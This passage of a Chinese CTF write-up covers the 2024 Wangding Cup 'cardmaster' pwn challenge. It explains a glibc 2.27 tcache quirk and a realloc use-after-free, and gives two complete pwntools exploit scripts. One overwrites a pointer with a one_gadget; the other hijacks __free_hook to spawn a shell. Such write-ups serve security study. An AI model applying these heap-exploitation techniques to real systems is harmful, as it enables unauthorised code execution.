<p>此时 <code>randomlvlptr</code> 会申请到一个 0x30 的堆，而这时候 10 * 8 &#x3D; 80，原有的 <code>list</code> 堆 0x30 会被释放。<br>再设置 count 为 0 可以释放 <code>randomlvlptr</code> 的 0x30，从而在其 fd 位置写入指针，调用 <code>getinfo</code> 即可泄露。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;suit chara set:%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)cards-&gt;ptr_record);</span><br></pre></td></tr></table></figure>

<p>同理，申请大堆块释放进入 unsorted bins 就可以泄露 libc 基址（这里即使 unsorted bin 与 top chunk 合并，仍然能泄露，<code>fd</code> <code>bk</code> 位置的信息在合并之后不会被删除）。</p>
<p>难就难在如何制造 double free。<br>最简单的方法就是直接利用 3ubuntu1 glibc 的 tcache 无检查 doublefree 特性产生 doublefree。（这里是看了 wp 才知道的点）<br><del>但是想不到 glibc 本身没有检查。印象中的 2.27 一直都是有 tcache double free 检测的。而且在 docker ubuntu18 上面测试也有检测，不知道是哪里问题了。</del></p>
<p>wp 直接利用 2.27 tcache 的特性，即不检查 tcachebins 的数量（这点在 docker ubuntu18 上成功验证了，该版本 glibc 似乎不会检查 tcache 计数）。<br>不检查计数，就会导致只要 <code>tcache_state</code> 中的对应 bins 位置有指针内容（地址非 0），<code>malloc</code> 就会尝试分配。<br>通过以下程序验证：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// docker ubuntu18 下编译</span></span><br><span class="line"><span class="comment">// gcc -z lazy -z noexecstack -no-pie -fno-stack-protector -g -o ./test ./test.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)a = a + <span class="number">0x30</span>;</span><br><span class="line">	**(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>**)a = a + <span class="number">0x60</span>;</span><br><span class="line">	a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行完最后一次 <code>malloc</code> 之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [ -2]: 0</span><br></pre></td></tr></table></figure>

<p>另外，还有一个特性是，对于已存放到 tcache 的指针，<code>realloc</code> 重新申请这个堆不会删除 tcache 中的记录，会导致 uaf。<br>例如 exp 中有这样一段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span></span><br><span class="line"><span class="comment"># 通过 uaf 修改 tcache fd 内容</span></span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(mng_mem))</span><br></pre></td></tr></table></figure>
<p>这里为什么可以修改 tcache 的 <code>fd</code> 呢？动调可以得知为什么。<br>首先是第一句 <code>setinfo(128, 0, 0, b&#39;a&#39;)</code>，会申请堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x5591c3c01231    call   malloc@plt                  &lt;malloc@plt&gt;</span><br><span class="line">       size: 0x200</span><br></pre></td></tr></table></figure>
<p>然后第二句 <code>setinfo(0, 0, 0)</code>，会释放堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x5591c3c01218    call   realloc@plt                 &lt;realloc@plt&gt;</span><br><span class="line">        ptr: 0x5591c56c9e00 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">        size: 0</span><br><span class="line">        </span><br><span class="line">执行后：</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x5591c56c9a50 ◂— 0</span><br><span class="line">0x60 [  1]: 0x5591c56c9670 ◂— 0</span><br><span class="line">0x210 [  1]: 0x5591c56c9e00 ◂— 0</span><br></pre></td></tr></table></figure>
<p>第三句 <code>setinfo(128, 0, 0, flat(mng_mem))</code> 奇特的点来了。由于 <code>ptr_record</code> 存放了先前已经被 <code>realloc</code> free 掉了的指针，所以再调用 <code>realloc</code> 理论上来说会扩展 &#x2F; 重新申请这个堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x5591c3c01218    call   realloc@plt                 &lt;realloc@plt&gt;</span><br><span class="line">       ptr: 0x5591c56c9e00 ◂— 0</span><br><span class="line">       size: 0x200</span><br></pre></td></tr></table></figure>
<p>但是执行了 <code>realloc</code> 之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x5591c3c0121d    mov    qword ptr [rbp - 0x18], rax     [0x7ffe0ce347d8] =&gt; 0x5591c56c9e00 ◂— 0</span><br><span class="line"> </span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x5591c56c9a50 ◂— 0</span><br><span class="line">0x60 [  1]: 0x5591c56c9670 ◂— 0</span><br><span class="line">0x210 [  1]: 0x5591c56c9e00 ◂— 0</span><br><span class="line">0x410 [  1]: 0x5591c56ca010 ◂— 0</span><br></pre></td></tr></table></figure>
<p>tcachebin 没有更新，但是 <code>realloc</code> 依旧返回了原来的指针，产生 uaf。<br><del>这一段可以查源码得知为什么，但是这里懒得展开讲了。</del></p>
<h1 id="exp1：修改堆上指针为-one-gadget"><a href="#exp1：修改堆上指针为-one-gadget" class="headerlink" title="exp1：修改堆上指针为 one_gadget"></a>exp1：修改堆上指针为 one_gadget</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y : p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y : p.sendlineafter(x, y)</span><br><span class="line">suheap = <span class="keyword">lambda</span> x : success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line">sulibc = <span class="keyword">lambda</span> x : success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p, gdbscript = gs)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setinfo</span>(<span class="params">count, ranges, lvl, content = <span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;suit count:&quot;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sla(<span class="string">b&quot;digit range 1 - ?&quot;</span>, <span class="built_in">str</span>(ranges).encode())</span><br><span class="line">    sla(<span class="string">b&quot;randomize level:&quot;</span>, <span class="built_in">str</span>(lvl).encode())</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        sa(<span class="string">b&quot;new suite set:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">og = <span class="literal">False</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> og:</span><br><span class="line">        ru(<span class="string">b&#x27;chara set:&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showcards</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">og = <span class="number">0x10a38c</span><span class="comment"># 0x4f2be 0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./cardmaster&#x27;</span></span><br><span class="line">elf = ELF(name, checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">p = process(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">setinfo(<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;abcd&#x27;</span>)</span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">getinfo()</span><br><span class="line">heapbase = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">suheap(heapbase)</span><br><span class="line">mng_mem = heapbase + <span class="number">0x1420</span><span class="comment"># 该偏移由下面多次 init 之后得到。指向最后创建的管理堆。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">1112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">getinfo()</span><br><span class="line">base = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">sulibc(base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf tcache bins attack</span></span><br><span class="line"><span class="comment"># 3ubuntu1 bugs</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span></span><br><span class="line"><span class="comment"># 通过 uaf 修改 tcache fd 内容</span></span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(mng_mem))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 210</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># init and malloc to -1</span></span><br><span class="line">init()</span><br><span class="line">og += base</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, og))</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">getinfo(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="exp2：打-freehook"><a href="#exp2：打-freehook" class="headerlink" title="exp2：打 freehook"></a>exp2：打 freehook</h1><p>另外还有一篇 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/91ac0m0/p/18573018">wp</a> 是打 freehook 的，基本同理，而且比较简单。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y : p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y : p.sendlineafter(x, y)</span><br><span class="line">sulibc = <span class="keyword">lambda</span> x : success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setinfo</span>(<span class="params">count, ranges, lvl, content = <span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;suit count:&quot;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sla(<span class="string">b&quot;digit range 1 - ?&quot;</span>, <span class="built_in">str</span>(ranges).encode())</span><br><span class="line">    sla(<span class="string">b&quot;randomize level:&quot;</span>, <span class="built_in">str</span>(lvl).encode())</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        sa(<span class="string">b&quot;new suite set:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">og = <span class="literal">False</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> og:</span><br><span class="line">        ru(<span class="string">b&#x27;chara set:&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showcards</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./cardmaster&#x27;</span></span><br><span class="line">elf = ELF(name, checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">p = process(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">setinfo(<span class="number">1112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># range 申请多个 block 阻止合并</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">getinfo()</span><br><span class="line">base = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">sulibc(base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf tcache bins attack</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment"># free</span></span><br><span class="line"><span class="comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span></span><br><span class="line"><span class="comment"># 通过 uaf 修改 tcache fd 内容</span></span><br><span class="line">freehook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(freehook - <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 210</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410 申请一次</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># init and malloc to -1</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(<span class="number">0</span>, system))</span><br><span class="line"></span><br><span class="line">init()<span class="comment"># malloc 申请</span></span><br><span class="line">setinfo(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题目，对 <code>realloc</code> 有了很多新的认识（<del>之前完全没有接触过</del>）。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.eqqie.cn/index.php/archives/1400/">https://www.eqqie.cn/index.php/archives/1400/</a><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1986276-1-1.html">https://www.52pojie.cn/thread-1986276-1-1.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15808">https://xz.aliyun.com/news/15808</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/91ac0m0/p/18573018">https://www.cnblogs.com/91ac0m0/p/18573018</a></p>
</blockquote>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/">
    <time datetime="2025-10-28T11:50:43.000Z" class="entry-date">
        2025-10-28
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

    
    </footer>
</article>


    
<nav class="nav-single">
    <h3 class="assistive-text">文章导航</h3>
    
        <span class="nav-previous"><a href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/" rel="prev"><span class="meta-nav">←</span> 跟着52pojie大佬分析一份木马样本</a></span>
    
    
        <span class="nav-next"><a href="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" rel="next">windows 重定位简单学习 <span class="meta-nav">→</span></a></span>
    
</nav><!-- .nav-single -->







</div></div>
        <div id="secondary" class="widget-area" role="complementary">
  
    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
    <div>
        <input type="text" value="" name="s" id="s" />
        <input type="submit" id="searchsubmit" value="搜索" />
    </div>
</form></aside>
  
    
  
    
  <aside class="widget">
    <h3 class="widget-title">Categories</h3>
    <div class="widget-content">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf%E6%99%AE%E9%80%9A/">ctf普通</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows-%E7%9B%B8%E5%85%B3/">windows 相关</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a><span class="category-list-count">1</span></li></ul>
    </div>
  </aside>

  
    
  <aside class="widget">
    <h3 class="widget-title">Recents</h3>
    <div class="widget-content">
      <ul>
        
          <li>
            <a href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/">跟着52pojie大佬分析一份木马样本</a>
          </li>
        
          <li>
            <a href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/">2024网鼎杯半决赛 cardmaster</a>
          </li>
        
          <li>
            <a href="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">windows 重定位简单学习</a>
          </li>
        
          <li>
            <a href="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">cve-2025-6218 winrar目录遍历漏洞复现与简单分析</a>
          </li>
        
          <li>
            <a href="/2024/11/27/gdbserver-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%B0%8F%E6%80%BB%E7%BB%93/">gdbserver 远程调试小总结</a>
          </li>
        
      </ul>
    </div>
  </aside>

  
    
  
    
  
</div>
      </div>
      <footer id="colophon" role="contentinfo">
    <!-- <p>&copy; 2025 shanza
    All rights reserved.</p> -->
    <p>&copy; 2025 shanza
    ❤️ Hor1zon</p>
    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</footer>
    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>

<script src="/js/jquery-3.3.1.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


<script src="/js/navigation.js"></script>

<div id="bg"></div>

  </div>
</body>
</html>